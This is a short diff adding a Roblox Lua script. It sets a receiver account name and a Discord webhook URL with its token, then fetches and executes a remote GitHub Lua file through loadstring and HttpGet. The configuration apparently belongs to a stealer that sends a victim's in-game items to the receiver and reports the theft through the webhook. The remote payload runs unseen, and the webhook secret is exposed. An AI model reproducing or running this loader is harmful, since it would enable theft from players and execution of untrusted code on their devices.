@@ -1,0 +1,4 @@
+Receiver = "solaryrobloxaziz"
+Webhook = "https://discord.com/api/webhooks/1274312473511592040/LxPl22gNKB5yYX1SHbbnx2kROzEbX5WVXbwQOPAhyoYVkNAKqczFz1VFTFFbXsOLgEoA"
+WaitAfterReceiverJoin = 18
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLOWORLDIMASKID/ScriptCake/main/CakeEater.lua"))()
